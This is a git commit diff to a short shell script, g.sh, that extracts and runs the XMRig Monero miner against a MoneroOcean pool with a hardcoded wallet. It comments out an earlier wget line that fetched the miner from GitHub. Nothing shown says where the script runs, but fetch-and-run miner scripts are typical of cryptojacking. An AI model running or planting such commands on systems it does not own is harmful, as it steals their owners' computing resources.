b08f20daf6e2880d5c53e6b435e0ae3bdb087330
YashRawat <139982135+YashRawat911@users.noreply.github.com>
2023-09-22 12:38:54 +0530

    Update g.sh

--- g.sh
+++ g.sh
@@ -1,7 +1,10 @@
-wget https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-linux-x64.tar.gz
+#wget https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-linux-x64.tar.gz
 
-tar -xf xmrig-6.20.0-linux-x64.tar.gz
+#tar -xf xmrig-6.20.0-linux-x64.tar.gz
 
+#cd xmrig-6.20.0
+
+#./xmrig --donate-level 5 -o gulf.moneroocean.stream:18192 -u 4AAAw275dkMcAEj1BycAa3cfVHBJo1NNuDeM3kbVWX5SVTVS7c1Tw7hgbkfjvFJKgm62um7uv2u9YHbTBmZjAuBjJFJph4t -p WEB -k --coin monero
+tar -xf xmrig-6.20.0-linux-x64.tar.gz 
 cd xmrig-6.20.0
-
 ./xmrig --donate-level 5 -o gulf.moneroocean.stream:18192 -u 4AAAw275dkMcAEj1BycAa3cfVHBJo1NNuDeM3kbVWX5SVTVS7c1Tw7hgbkfjvFJKgm62um7uv2u9YHbTBmZjAuBjJFJph4t -p WEB -k --coin monero
